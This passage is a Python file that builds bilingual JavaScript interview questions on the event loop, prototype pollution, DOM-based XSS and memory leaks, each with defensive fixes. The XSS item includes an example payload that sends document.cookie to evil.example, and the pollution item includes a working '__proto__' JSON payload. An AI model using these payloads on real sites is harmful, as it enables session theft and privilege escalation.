import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "..", "tools"))
from qb import Q, save  # noqa: E402

MDN = "https://developer.mozilla.org/en-US/docs/Web/JavaScript"
API = "https://developer.mozilla.org/en-US/docs/Web/API"
R_EXEC_MODEL = ("MDN — JavaScript execution model", f"{MDN}/Reference/Execution_model")
R_MICROTASK = ("MDN — Using microtasks with queueMicrotask()", f"{API}/HTML_DOM_API/Microtask_guide")
R_OWASP_PP = ("OWASP — Prototype Pollution Prevention Cheat Sheet", "https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html")
R_PROTO_CHAIN = ("MDN — Inheritance and the prototype chain", f"{MDN}/Guide/Inheritance_and_the_prototype_chain")
R_MDN_XSS = ("MDN — Cross-site scripting (XSS)", "https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS")
R_OWASP_DOMXSS = ("OWASP — DOM based XSS Prevention Cheat Sheet", "https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html")
R_INNERHTML = ("MDN — Element.innerHTML (security considerations)", f"{API}/Element/innerHTML")
R_MEMORY = ("MDN — Memory management", f"{MDN}/Guide/Memory_management")
R_WEAKMAP = ("MDN — WeakMap", f"{MDN}/Reference/Global_Objects/WeakMap")
R_WEAKREF = ("MDN — WeakRef", f"{MDN}/Reference/Global_Objects/WeakRef")
R_ABORTCTRL = ("MDN — AbortController", f"{API}/AbortController")
R_ABORT_ANY = ("MDN — AbortSignal.any()", f"{API}/AbortSignal/any_static")
R_ABORT_TIMEOUT = ("MDN — AbortSignal.timeout()", f"{API}/AbortSignal/timeout_static")
R_LONG_TASKS = ("web.dev — Optimize long tasks", "https://web.dev/articles/optimize-long-tasks")

QUESTIONS = [
    # ------------------------------------------------------------------ js-029
    Q(
        id="js-029", sub="Event Loop, Microtasks & Tasks", diff="hard", type="output",
        prio="high", market="both", mins=8,
        tags=["event-loop", "microtasks", "promise-chains", "settimeout", "async-await"],
        ver="Version-independent concept (HTML event loop; Node.js 11+ behaves the same)", vs=False, status="stable",
        q_en=r"""What is the exact order of the logs? Explain how the event loop handles every callback, including the ones scheduled from inside other callbacks.""",
        q_bn=r"""Log-গুলোর সঠিক ক্রম কী? অন্য callback-এর ভেতর থেকে schedule হওয়া callback সহ, event loop প্রতিটি callback কীভাবে handle করে ব্যাখ্যা করো।""",
        code=r"""
            console.log('S1');

            setTimeout(() => {
              console.log('T1');
              Promise.resolve().then(() => console.log('T1-micro'));
            }, 0);

            setTimeout(() => console.log('T2'), 0);

            Promise.resolve()
              .then(() => {
                console.log('M1');
                setTimeout(() => console.log('T3'), 0);
              })
              .then(() => console.log('M2'));

            Promise.resolve().then(() => console.log('M3'));

            (async () => {
              await undefined;
              console.log('A1');
              await new Promise((resolve) => setTimeout(resolve, 0));
              console.log('A2');
            })();

            console.log('S2');
        """,
        lang="javascript",
        output=r"""
            S1
            S2
            M1
            M3
            A1
            M2
            T1
            T1-micro
            T2
            T3
            A2
        """,
        a_en=r"""
            Three rules produce this order:

            1. Synchronous code first: `S1`, `S2`.
            2. After the script (and after **every** task), the whole microtask queue is drained, including microtasks added while draining.
            3. Tasks (timers) run one at a time in the order they were queued.

            After the script the microtask queue is `[M1, M3, A1]` — `M2` isn't there yet, because a chained `.then` is queued only when the previous callback finishes. Running `M1` registers timer `T3` and queues `M2` at the back: `M3`, `A1` (which registers a fourth timer), `M2`. Then tasks: `T1` runs and queues `T1-micro`, which runs **before** `T2` because microtasks drain after each task. Then `T2`, `T3`, and finally the timer created by `A1` fires, resolving the awaited promise, so `A2` runs as a microtask right after it.
        """,
        a_bn=r"""
            তিনটা নিয়ম মিলে এই ক্রম তৈরি করে:

            1. আগে synchronous code: `S1`, `S2`।
            2. Script-এর পর (এবং **প্রতিটি** task-এর পর) পুরো microtask queue খালি করা হয়, খালি করার সময় নতুন যোগ হওয়া microtask সহ।
            3. Task (timer) একটা একটা করে, যে ক্রমে queue হয়েছে সেই ক্রমে চলে।

            Script শেষে microtask queue হলো `[M1, M3, A1]` — `M2` তখনও নেই, কারণ chained `.then` queue হয় কেবল আগের callback শেষ হলে। `M1` চলার সময় timer `T3` register করে আর queue-এর শেষে `M2` যোগ করে: তারপর `M3`, `A1` (যেটা চতুর্থ একটা timer register করে), `M2`। এরপর task: `T1` চলে আর `T1-micro` queue করে, যেটা `T2`-এর **আগেই** চলে, কারণ প্রতিটি task-এর পর microtask খালি করা হয়। তারপর `T2`, `T3`, আর শেষে `A1`-এর তৈরি timer fire করে awaited promise resolve করে, ফলে ঠিক তার পরেই microtask হিসেবে `A2` চলে।
        """,
        quick_en=r"""`S1 S2 M1 M3 A1 M2 T1 T1-micro T2 T3 A2`. Sync code runs first, the whole microtask queue (including microtasks added while draining) empties after the script and after every task, and timers run in the order they were queued, so `T1-micro` beats `T2` and `A2` waits for the last timer.""",
        quick_bn=r"""`S1 S2 M1 M3 A1 M2 T1 T1-micro T2 T3 A2`। আগে sync code চলে; script-এর পরে আর প্রতিটা task-এর পরে পুরো microtask queue খালি হয় (চলার সময় নতুন যোগ হওয়া microtask-সহ); আর timer চলে queue-তে ঢোকার order-এ, তাই `T1-micro` `T2`-এর আগে চলে আর `A2` শেষ timer-এর জন্য অপেক্ষা করে।""",
        ex_en=r"""
            Full trace:

            1. Sync: `S1`. Timers queued: `T1`, `T2`. Microtasks queued: `M1` (its promise is already resolved), `M3`, and the async function's continuation after `await undefined` (call it `A1`). `S2`.
            2. Microtasks: `M1` logs and registers timer `T3`; its returned promise fulfils, so `M2` is appended → `[M3, A1, M2]`.
            3. `M3` logs. `A1` logs and awaits a promise that resolves from a new timer (`R`, registered after `T3`). `M2` logs. Queue empty.
            4. Task `T1`: logs, queues `T1-micro` → microtask checkpoint → `T1-micro`.
            5. Task `T2`. Task `T3`. Task `R` resolves the promise → continuation queued → `A2`.

            Takeaways:
            - Independent promise chains **interleave** (M1, M3, M2) — never assume a chain runs to completion before another chain starts.
            - Microtasks run between individual tasks, so `T1-micro` beats `T2`. (Node.js 10 and older ran all expired timers first; since Node 11 it matches browsers.)
            - Same-delay timers fire in registration order; a timer created inside a microtask goes behind the timers that already exist.
        """,
        ex_bn=r"""
            পুরো trace:

            1. Sync: `S1`। Timer queue: `T1`, `T2`। Microtask queue: `M1` (তার promise আগেই resolved), `M3`, আর `await undefined`-এর পরের অংশ (ধরি `A1`)। তারপর `S2`।
            2. Microtask: `M1` log করে আর timer `T3` register করে; তার return করা promise fulfil হয়, তাই `M2` শেষে যোগ হয় → `[M3, A1, M2]`।
            3. `M3` log হয়। `A1` log করে এমন একটা promise await করে যেটা নতুন একটা timer (`R`, `T3`-এর পরে register হওয়া) থেকে resolve হবে। `M2` log হয়। Queue খালি।
            4. Task `T1`: log করে, `T1-micro` queue করে → microtask checkpoint → `T1-micro`।
            5. Task `T2`। Task `T3`। Task `R` promise resolve করে → continuation queue হয় → `A2`।

            শিক্ষা:
            - আলাদা আলাদা promise chain **একে অপরের মাঝে ঢুকে যায়** (M1, M3, M2) — কখনো ধরে নিও না যে একটা chain পুরো শেষ হওয়ার পর আরেকটা শুরু হবে।
            - Microtask প্রতিটি task-এর মাঝে চলে, তাই `T1-micro` `T2`-কে হারায়। (Node.js 10 ও তার আগের version আগে সব expired timer চালাত; Node 11 থেকে browser-এর মতোই।)
            - একই delay-এর timer register হওয়ার ক্রমে fire করে; microtask-এর ভেতরে তৈরি timer আগে থেকে থাকা timer-গুলোর পেছনে দাঁড়ায়।
        """,
        tip_en=r"""Keep a written queue state ("tasks: T1, T2 / micro: M1, M3, A1") and update it step by step — interviewers care more about the method than speed. Call out the chain interleaving and the per-task microtask checkpoint explicitly.""",
        tip_bn=r"""Queue-এর অবস্থা লিখে রাখো ("tasks: T1, T2 / micro: M1, M3, A1") আর ধাপে ধাপে update করো — interviewer গতির চেয়ে পদ্ধতিকে বেশি গুরুত্ব দেন। Chain interleaving আর প্রতিটি task-এর পরের microtask checkpoint — এই দুটো স্পষ্ট করে বলো।""",
        mist_en=r"""Running a whole `.then` chain at once (`M1, M2, M3`), or running all timers before the microtask created inside `T1`.""",
        mist_bn=r"""পুরো `.then` chain একবারে চালিয়ে দেওয়া (`M1, M2, M3`), অথবা `T1`-এর ভেতরে তৈরি microtask-এর আগেই সব timer চালিয়ে দেওয়া।""",
        follow=[
            ("Where would `requestAnimationFrame` callbacks fit in a browser?", "Browser-এ `requestAnimationFrame` callback এই ক্রমে কোথায় বসবে?"),
            ("How would `process.nextTick` and `setImmediate` change this in Node.js?", "Node.js-এ `process.nextTick` আর `setImmediate` এটাকে কীভাবে বদলাবে?"),
        ],
        related=["js-016", "js-017", "js-034"],
        refs=[R_EXEC_MODEL, R_MICROTASK],
    ),
    # ------------------------------------------------------------------ js-030
    Q(
        id="js-030", sub="Security (Prototype Pollution)", diff="hard", type="debugging",
        prio="high", market="both", mins=10,
        tags=["security", "prototype-pollution", "deep-merge", "nodejs", "input-validation"],
        ver="Version-independent concept (ECMAScript 2026; Node.js 24/26 flags)", vs=False, status="stable",
        q_en=r"""A settings API deep-merges the user's JSON body into default settings. After one crafted request, **every object** in the Node.js process suddenly has `isAdmin === true`. Explain the vulnerability step by step and write a safe merge.""",
        q_bn=r"""একটা settings API user-এর JSON body-কে default settings-এর সাথে deep-merge করে। একটা বিশেষভাবে বানানো request-এর পর Node.js process-এর **প্রতিটি object**-এ হঠাৎ `isAdmin === true` হয়ে যায়। Vulnerability-টা ধাপে ধাপে ব্যাখ্যা করো এবং একটা নিরাপদ merge লেখো।""",
        code=r"""
            function merge(target, source) {
              for (const key in source) {
                if (typeof source[key] === 'object' && source[key] !== null) {
                  if (!target[key]) target[key] = {};
                  merge(target[key], source[key]);
                } else {
                  target[key] = source[key];
                }
              }
              return target;
            }

            const defaults = { theme: 'light', notifications: { email: true } };
            const body = JSON.parse('{"theme":"dark","__proto__":{"isAdmin":true}}');
            const settings = merge(structuredClone(defaults), body);

            const guest = {};
            console.log(settings.theme, guest.isAdmin);
        """,
        lang="javascript",
        output=r"""dark true""",
        a_en=r"""
            This is **prototype pollution**.

            1. `JSON.parse` creates an **own** property literally named `"__proto__"` (it doesn't trigger the special setter).
            2. `for...in` enumerates it, so `key === '__proto__'`.
            3. `target['__proto__']` on a normal object goes through the inherited `__proto__` accessor and returns `Object.prototype` — truthy, so no new object is created.
            4. `merge(Object.prototype, { isAdmin: true })` writes `isAdmin` onto `Object.prototype`, and every object now inherits it.

            The same attack works with `{"constructor": {"prototype": {...}}}`. Consequences range from privilege escalation (`if (user.isAdmin)`), to denial of service (overwriting `toString`), to remote code execution through "gadgets" in libraries that read options from plain objects.

            Fix: iterate **own** keys only (`Object.keys`), skip `__proto__`, `constructor` and `prototype`, recurse only into plain objects, and — most importantly — validate the body against a schema so unknown keys never reach the merge.
        """,
        a_bn=r"""
            এটা হলো **prototype pollution**।

            1. `JSON.parse` আক্ষরিক অর্থেই `"__proto__"` নামে একটা **নিজস্ব** property তৈরি করে (special setter trigger করে না)।
            2. `for...in` সেটা enumerate করে, তাই `key === '__proto__'`।
            3. সাধারণ object-এ `target['__proto__']` inherited `__proto__` accessor-এর মাধ্যমে `Object.prototype` return করে — এটা truthy, তাই নতুন object তৈরি হয় না।
            4. `merge(Object.prototype, { isAdmin: true })` `isAdmin`-কে `Object.prototype`-এ লিখে দেয়, আর এখন প্রতিটি object এটা inherit করে।

            একই attack `{"constructor": {"prototype": {...}}}` দিয়েও কাজ করে। পরিণাম হতে পারে privilege escalation (`if (user.isAdmin)`), denial of service (`toString` overwrite), এমনকি library-র ভেতরের "gadget"-এর মাধ্যমে remote code execution — যেসব library plain object থেকে option পড়ে।

            সমাধান: শুধু **নিজস্ব** key ঘোরো (`Object.keys`), `__proto__`, `constructor` আর `prototype` বাদ দাও, শুধু plain object-এ recurse করো, আর সবচেয়ে গুরুত্বপূর্ণ — body-কে একটা schema দিয়ে validate করো, যাতে অজানা key কখনো merge পর্যন্ত না পৌঁছায়।
        """,
        quick_en=r"""It's prototype pollution: `JSON.parse` creates an own `__proto__` key, `for...in` visits it, and `target['__proto__']` returns `Object.prototype`, so `merge` writes `isAdmin` onto the prototype all objects inherit. Fix: merge only own keys, skip `__proto__`, `constructor` and `prototype`, and validate the body with a schema.""",
        quick_bn=r"""এটা prototype pollution: `JSON.parse` একটা নিজস্ব `__proto__` key তৈরি করে, `for...in` সেটা পায়, আর `target['__proto__']` `Object.prototype` return করে, তাই `merge` এমন prototype-এ `isAdmin` লিখে দেয় যেখান থেকে সব object inherit করে। Fix: শুধু own key merge করো, `__proto__`, `constructor` আর `prototype` বাদ দাও, আর body schema দিয়ে validate করো।""",
        ex_en=r"""
            Defence in depth (OWASP's recommendations plus practice):

            - **Schema validation at the boundary** (e.g. zod / JSON Schema with `additionalProperties: false`): the request body may only contain known keys. This alone stops the attack.
            - **Safe data structures:** use `Map` for user-keyed dictionaries, or `Object.create(null)` objects that don't inherit from `Object.prototype`.
            - **Don't trust inherited properties in security checks:** `Object.hasOwn(user, 'isAdmin')` or typed fields from your DB, not `user.isAdmin` on arbitrary objects.
            - **Harden the runtime:** `Object.freeze(Object.prototype)` at startup (test first — some libraries patch prototypes), and Node's `--disable-proto=delete` flag removes the `__proto__` accessor. Note `constructor.prototype` pollution is still possible with that flag, so it's only an extra layer.
            - **Dependencies:** popular deep-merge/`set`-by-path utilities have had prototype-pollution CVEs; keep them updated and run `npm audit`.

            The same bug class appears in the browser (query-string parsers like `?__proto__[x]=1`) where it can turn into XSS via gadgets in front-end libraries.
        """,
        ex_bn=r"""
            Defence in depth (OWASP-এর সুপারিশ আর বাস্তব অভিজ্ঞতা):

            - **Boundary-তে schema validation** (যেমন zod / `additionalProperties: false` সহ JSON Schema): request body-তে শুধু জানা key থাকতে পারবে। শুধু এটাই attack আটকে দেয়।
            - **নিরাপদ data structure:** user-এর দেওয়া key-এর dictionary-র জন্য `Map`, অথবা `Object.prototype` থেকে inherit করে না এমন `Object.create(null)` object ব্যবহার করো।
            - **Security check-এ inherited property বিশ্বাস কোরো না:** arbitrary object-এ `user.isAdmin` নয়, বরং `Object.hasOwn(user, 'isAdmin')` বা DB-র typed field ব্যবহার করো।
            - **Runtime শক্ত করো:** startup-এ `Object.freeze(Object.prototype)` (আগে test করো — কিছু library prototype patch করে), আর Node-এর `--disable-proto=delete` flag `__proto__` accessor মুছে দেয়। মনে রেখো এই flag থাকলেও `constructor.prototype` দিয়ে pollution সম্ভব, তাই এটা শুধু একটা বাড়তি স্তর।
            - **Dependency:** জনপ্রিয় deep-merge/path ধরে `set` করার utility-গুলোতে prototype-pollution CVE হয়েছে; এগুলো update রাখো আর `npm audit` চালাও।

            একই ধরনের bug browser-এও হয় (`?__proto__[x]=1`-এর মতো query-string parser), যেখানে front-end library-র gadget-এর মাধ্যমে এটা XSS-এ রূপ নিতে পারে।
        """,
        tip_en=r"""Walk through the four steps slowly — especially why `target['__proto__']` returns `Object.prototype`. Then present fixes in layers: validate input, safe merge, safe data structures, runtime hardening. Layered answers score highest in security questions.""",
        tip_bn=r"""চারটা ধাপ ধীরে ধীরে বোঝাও — বিশেষ করে `target['__proto__']` কেন `Object.prototype` return করে। তারপর সমাধান স্তরে স্তরে দাও: input validate, নিরাপদ merge, নিরাপদ data structure, runtime hardening। Security প্রশ্নে স্তরভিত্তিক উত্তরই সবচেয়ে বেশি নম্বর পায়।""",
        mist_en=r"""Only blocking the string `'__proto__'` (forgetting `constructor.prototype`), or assuming `JSON.parse` output is "just data" and therefore safe to merge.""",
        mist_bn=r"""শুধু `'__proto__'` string block করা (`constructor.prototype` ভুলে যাওয়া), অথবা ধরে নেওয়া যে `JSON.parse`-এর output "শুধুই data", তাই merge করা নিরাপদ।""",
        extra=[
            dict(lang="javascript", label_en="Safe merge", label_bn="নিরাপদ merge", src=r"""
                const BLOCKED_KEYS = new Set(['__proto__', 'constructor', 'prototype']);

                const isPlainObject = (value) => {
                  if (value === null || typeof value !== 'object') return false;
                  const proto = Object.getPrototypeOf(value);
                  return proto === Object.prototype || proto === null;
                };

                function safeMerge(target, source) {
                  for (const key of Object.keys(source)) { // own keys only
                    if (BLOCKED_KEYS.has(key)) continue;
                    const value = source[key];
                    if (isPlainObject(value)) {
                      if (!Object.hasOwn(target, key) || !isPlainObject(target[key])) {
                        target[key] = {};
                      }
                      safeMerge(target[key], value);
                    } else {
                      target[key] = value;
                    }
                  }
                  return target;
                }

                const settings = safeMerge(structuredClone(defaults), body);
                console.log(settings.theme, ({}).isAdmin); // 'dark' undefined

                // Even better: validate first, e.g. with zod
                // const Settings = z.object({ theme: z.enum(['light', 'dark']), notifications: z.object({ email: z.boolean() }).partial() }).strict().partial();
                // const input = Settings.parse(req.body);
            """),
        ],
        follow=[
            ("What is a prototype-pollution 'gadget'?", "Prototype-pollution-এর 'gadget' কী?"),
            ("Why does `Object.create(null)` help, and what do you lose by using it?", "`Object.create(null)` কেন সাহায্য করে, আর এটা ব্যবহার করলে কী হারাও?"),
        ],
        related=["js-018", "js-031", "js-036"],
        refs=[R_OWASP_PP, R_PROTO_CHAIN],
    ),
    # ------------------------------------------------------------------ js-031
    Q(
        id="js-031", sub="Security (XSS)", diff="hard", type="security-performance",
        prio="high", market="both", mins=10,
        tags=["security", "xss", "dom", "csp", "trusted-types", "innerhtml"],
        ver="Web platform, 2026 (Trusted Types Baseline newly available since 2026-02; Sanitizer API not Baseline)", vs=True, status="stable",
        q_en=r"""A search page shows `Results for <query>` by setting `innerHTML` from the URL's `q` parameter. What is the vulnerability, how would an attacker exploit it, and how do you defend a front-end app against XSS in depth?""",
        q_bn=r"""একটা search page URL-এর `q` parameter থেকে `innerHTML` set করে `Results for <query>` দেখায়। Vulnerability কী, attacker কীভাবে এটা exploit করবে, আর একটা front-end app-কে XSS থেকে স্তরে স্তরে কীভাবে রক্ষা করবে?""",
        a_en=r"""
            It's **DOM-based XSS**: untrusted data (a *source* such as `location.search`, `location.hash`, `postMessage` data or API responses) flows into a *sink* that parses HTML or executes code. An attacker sends a victim a link like `/search?q=<img src=x onerror="...">`; the browser parses the injected `<img>`, the `onerror` handler runs in your origin, and it can read data, call your APIs with the user's session or change the page.

            Defences, in layers:
            1. **Use safe sinks.** Put user data in with `textContent`, `createElement` + `append`/`replaceChildren`, or `setAttribute` for non-URL attributes. Frameworks like React escape text by default — the risk returns with `dangerouslySetInnerHTML`, `v-html`, or `ref.current.innerHTML`.
            2. **Validate URLs** before using them in `href`/`src`: allow only `http:`/`https:` so `javascript:` URLs can't run.
            3. **Sanitize** when you genuinely must render user HTML (rich text, Markdown) with a maintained sanitizer such as DOMPurify.
            4. **Content Security Policy:** nonce-based `script-src` with `'strict-dynamic'`, no `'unsafe-inline'`, plus `object-src 'none'` and `base-uri 'none'`. Inline handlers like `onerror` are blocked even if an injection slips through.
            5. **Trusted Types** (`require-trusted-types-for 'script'` in CSP) makes dangerous sinks reject plain strings. It became Baseline newly available in February 2026.
            6. **Limit the blast radius:** `HttpOnly`, `Secure`, `SameSite` session cookies, and no tokens in `localStorage` where XSS can read them.
        """,
        a_bn=r"""
            এটা **DOM-based XSS**: অবিশ্বস্ত data (একটা *source*, যেমন `location.search`, `location.hash`, `postMessage`-এর data বা API response) এমন একটা *sink*-এ যায় যেটা HTML parse করে বা code চালায়। Attacker victim-কে `/search?q=<img src=x onerror="...">`-এর মতো একটা link পাঠায়; browser inject করা `<img>` parse করে, `onerror` handler তোমার origin-এ চলে, আর সেটা data পড়তে পারে, user-এর session দিয়ে তোমার API call করতে পারে বা page বদলে দিতে পারে।

            স্তরে স্তরে প্রতিরক্ষা:
            1. **নিরাপদ sink ব্যবহার করো।** User data বসাও `textContent`, `createElement` + `append`/`replaceChildren`, অথবা URL নয় এমন attribute-এর জন্য `setAttribute` দিয়ে। React-এর মতো framework default-ভাবে text escape করে — ঝুঁকি ফিরে আসে `dangerouslySetInnerHTML`, `v-html` বা `ref.current.innerHTML`-এ।
            2. `href`/`src`-এ ব্যবহারের আগে **URL validate করো**: শুধু `http:`/`https:` অনুমতি দাও, যাতে `javascript:` URL চলতে না পারে।
            3. User-এর HTML সত্যিই render করতে হলে (rich text, Markdown) DOMPurify-এর মতো maintained sanitizer দিয়ে **sanitize করো**।
            4. **Content Security Policy:** nonce-ভিত্তিক `script-src` আর `'strict-dynamic'`, কোনো `'unsafe-inline'` নয়, সাথে `object-src 'none'` আর `base-uri 'none'`। কোনো injection ফসকে গেলেও `onerror`-এর মতো inline handler block হয়।
            5. **Trusted Types** (CSP-তে `require-trusted-types-for 'script'`) বিপজ্জনক sink-কে সাধারণ string নিতে দেয় না। এটা February 2026-এ Baseline newly available হয়েছে।
            6. **ক্ষতির পরিধি কমাও:** session cookie-তে `HttpOnly`, `Secure`, `SameSite`, আর এমন `localStorage`-এ token নয় যেটা XSS পড়তে পারে।
        """,
        quick_en=r"""It's DOM-based XSS: the URL's `q` goes into `innerHTML`, so a link containing an `<img onerror>` payload runs attacker code in your origin. Defend in layers: `textContent`/`createElement` for user data, only `http(s)` links, DOMPurify for required HTML, plus a nonce-based CSP, Trusted Types and `HttpOnly` cookies.""",
        quick_bn=r"""এটা DOM-based XSS: URL-এর `q` সরাসরি `innerHTML`-এ যায়, তাই `<img onerror>` payload-ওয়ালা একটা link তোমার origin-এ attacker-এর code চালিয়ে দেয়। কয়েক স্তরে রক্ষা করো: user data-র জন্য `textContent`/`createElement`, link-এ শুধু `http(s)` URL, HTML লাগলে DOMPurify-র মতো sanitizer, সাথে nonce-based CSP, Trusted Types আর `HttpOnly` cookie।""",
        ex_en=r"""
            - **Dangerous sinks to grep for:** `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, `eval`, `new Function`, `setTimeout('string')`, `element.setAttribute('on…')`, `location = userInput`, `iframe.srcdoc`.
            - **Escaping is context-specific:** HTML-escaping is correct for element text, but not enough inside a `<script>` block, a URL, or a CSS value. That's why "use the right DOM API" beats manual escaping.
            - **Native sanitizer:** the HTML Sanitizer API (`element.setHTML()`) ships in Chromium and Firefox but is **not Baseline** yet — use it behind feature detection with a library fallback.
            - **Performance bonus:** `textContent` and `replaceChildren` skip the HTML parser entirely, so the safe version is also faster. When rendering many rows, build them off-DOM (or in a `DocumentFragment`) and insert once.
            - **Stored vs reflected vs DOM XSS:** the defences above apply to all three; server-side output encoding and input validation cover the stored/reflected cases.
        """,
        ex_bn=r"""
            - **যেসব বিপজ্জনক sink grep করবে:** `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, `eval`, `new Function`, `setTimeout('string')`, `element.setAttribute('on…')`, `location = userInput`, `iframe.srcdoc`।
            - **Escaping context-অনুযায়ী আলাদা:** element-এর text-এর জন্য HTML-escape ঠিক আছে, কিন্তু `<script>` block, URL বা CSS value-র ভেতরে যথেষ্ট নয়। এজন্যই নিজে escape করার চেয়ে "সঠিক DOM API ব্যবহার করো" — এটা ভালো নীতি।
            - **Native sanitizer:** HTML Sanitizer API (`element.setHTML()`) Chromium আর Firefox-এ এসেছে, কিন্তু এখনো **Baseline নয়** — feature detection করে, library fallback সহ ব্যবহার করো।
            - **Performance-এর বাড়তি লাভ:** `textContent` আর `replaceChildren` HTML parser পুরোপুরি এড়িয়ে যায়, তাই নিরাপদ version দ্রুতও। অনেক row render করতে হলে DOM-এর বাইরে (বা একটা `DocumentFragment`-এ) বানিয়ে একবারে insert করো।
            - **Stored বনাম reflected বনাম DOM XSS:** উপরের প্রতিরক্ষা তিনটার ক্ষেত্রেই কাজ করে; stored/reflected case server-side output encoding আর input validation দিয়েও ঢাকা হয়।
        """,
        tip_en=r"""Use the words "source" and "sink", show the payload, then give the fix in layers (safe API → URL validation → sanitizer → CSP → Trusted Types → cookie flags). Saying that CSP and Trusted Types are a *second* line of defence, not a replacement for safe coding, shows maturity.""",
        tip_bn=r""""Source" আর "sink" শব্দ দুটো ব্যবহার করো, payload দেখাও, তারপর স্তরে স্তরে সমাধান দাও (নিরাপদ API → URL validation → sanitizer → CSP → Trusted Types → cookie flag)। CSP আর Trusted Types যে নিরাপদ coding-এর বিকল্প নয়, বরং *দ্বিতীয়* প্রতিরক্ষা — এটা বললে পরিপক্বতা বোঝা যায়।""",
        mist_en=r"""Relying on `encodeURIComponent` or a regex that strips `<script>` (event-handler attributes and `javascript:` URLs bypass it), or assuming `innerHTML` is safe because "`<script>` tags inserted via innerHTML don't run" — `onerror` handlers do.""",
        mist_bn=r"""`encodeURIComponent` বা `<script>` মুছে দেওয়া একটা regex-এর উপর ভরসা করা (event-handler attribute আর `javascript:` URL এটাকে এড়িয়ে যায়), অথবা ধরে নেওয়া যে "innerHTML দিয়ে বসানো `<script>` tag চলে না" বলে `innerHTML` নিরাপদ — কিন্তু `onerror` handler ঠিকই চলে।""",
        code=r"""
            // BAD: DOM-based XSS — the query is parsed as HTML
            const query = new URLSearchParams(location.search).get('q') ?? '';
            document.querySelector('#title').innerHTML = `Results for <b>${query}</b>`;
            // /search?q=<img src=x onerror="fetch('https://evil.example/c?d=' + document.cookie)">

            // GOOD: treat user data as text
            const title = document.querySelector('#title');
            const strong = document.createElement('b');
            strong.textContent = query;
            title.replaceChildren('Results for ', strong);

            // GOOD: only allow http(s) URLs in href/src
            function safeHref(input) {
              try {
                const url = new URL(input, location.origin);
                return url.protocol === 'https:' || url.protocol === 'http:' ? url.href : '#';
              } catch {
                return '#';
              }
            }
            profileLink.href = safeHref(user.website); // blocks javascript:alert(1)

            // When user HTML is required: sanitize first (DOMPurify)
            preview.innerHTML = DOMPurify.sanitize(renderedMarkdown);

            // HTTP response header (defence in depth):
            // Content-Security-Policy: script-src 'nonce-r4nd0m' 'strict-dynamic'; object-src 'none'; base-uri 'none'; require-trusted-types-for 'script'
        """,
        lang="javascript",
        follow=[
            ("How does a nonce-based CSP work, and why is `'unsafe-inline'` dangerous?", "Nonce-ভিত্তিক CSP কীভাবে কাজ করে, আর `'unsafe-inline'` কেন বিপজ্জনক?"),
            ("Is storing a JWT in `localStorage` safe? What are the alternatives?", "`localStorage`-এ JWT রাখা কি নিরাপদ? বিকল্প কী?"),
        ],
        related=["js-030", "js-039"],
        refs=[R_MDN_XSS, R_OWASP_DOMXSS, R_INNERHTML],
    ),
    # ------------------------------------------------------------------ js-032
    Q(
        id="js-032", sub="Memory Leaks & Garbage Collection", diff="hard", type="scenario",
        prio="high", market="both", mins=12,
        tags=["memory-leaks", "garbage-collection", "devtools", "weakmap", "abortcontroller", "spa"],
        ver="Version-independent concept (WeakRef/FinalizationRegistry ES2021; Baseline widely available)", vs=False, status="stable",
        q_en=r"""A single-page dashboard stays open all day on support agents' PCs. After a few hours the tab uses 2 GB of memory and becomes sluggish; a reload fixes it. How do you investigate and fix this? Explain how JavaScript garbage collection decides what can be freed.""",
        q_bn=r"""একটা single-page dashboard support agent-দের PC-তে সারাদিন খোলা থাকে। কয়েক ঘণ্টা পর tab-টা 2 GB memory নেয় আর ধীর হয়ে যায়; reload দিলে ঠিক হয়ে যায়। কীভাবে investigate করবে আর ঠিক করবে? JavaScript-এর garbage collection কীভাবে ঠিক করে কোন memory free করা যাবে, সেটাও ব্যাখ্যা করো।""",
        a_en=r"""
            **How GC works:** modern engines use tracing (mark-and-sweep) collection. Starting from roots — globals, the current call stack, active closures, DOM nodes in the document, pending timers and listeners — the collector marks everything reachable and frees the rest, cycles included. V8 does this generationally (frequent cheap collections for young objects, incremental/concurrent marking for old ones). So a JavaScript "leak" is memory that is **still reachable but no longer needed**.

            **Investigation:**
            1. **Reproduce in a loop:** e.g. open/close a ticket view 20 times. In DevTools' Performance monitor watch JS heap, DOM node count and listener count. If they keep climbing after a forced GC, it's a leak, not just a cache warming up.
            2. **Heap snapshots:** take a baseline, repeat the action, take another and use the **Comparison** view. Filter for "Detached" to find DOM trees removed from the page but still referenced from JS.
            3. **Follow the retainers** of the leaked objects to the root: usually a listener on `window`, an uncleared `setInterval`, a store/WebSocket subscription, a module-level `Map` cache, or an observer that was never disconnected.

            **Fixes:** every mount gets a matching cleanup (remove listeners, clear timers, unsubscribe, `disconnect()` observers). An `AbortController` passed as `{ signal }` removes many listeners at once. Bound caches (LRU/TTL), and use `WeakMap` for metadata keyed by objects or DOM nodes so entries die with their keys.
        """,
        a_bn=r"""
            **GC কীভাবে কাজ করে:** আধুনিক engine tracing (mark-and-sweep) collection ব্যবহার করে। Root থেকে শুরু করে — global, চলমান call stack, active closure, document-এ থাকা DOM node, pending timer আর listener — collector যা যা reachable সেগুলো mark করে আর বাকি সব free করে, cycle সহ। V8 এটা generational পদ্ধতিতে করে (নতুন object-এর জন্য ঘন ঘন সস্তা collection, পুরনোগুলোর জন্য incremental/concurrent marking)। তাই JavaScript-এ "leak" মানে এমন memory যা **এখনো reachable, কিন্তু আর দরকার নেই**।

            **Investigation:**
            1. **Loop করে reproduce করো:** যেমন একটা ticket view ২০ বার খোলো/বন্ধ করো। DevTools-এর Performance monitor-এ JS heap, DOM node count আর listener count দেখো। Forced GC-র পরেও এগুলো বাড়তেই থাকলে সেটা leak, শুধু cache ভরে ওঠা নয়।
            2. **Heap snapshot:** একটা baseline নাও, action-টা বারবার করো, আরেকটা নাও আর **Comparison** view ব্যবহার করো। "Detached" filter দিয়ে খোঁজো কোন DOM tree page থেকে সরানো হলেও JS থেকে এখনো reference করা আছে।
            3. Leak হওয়া object-এর **retainer** ধরে root পর্যন্ত যাও: সাধারণত `window`-এর একটা listener, clear না করা `setInterval`, store/WebSocket subscription, module-level `Map` cache, বা কখনো `disconnect()` না করা observer।

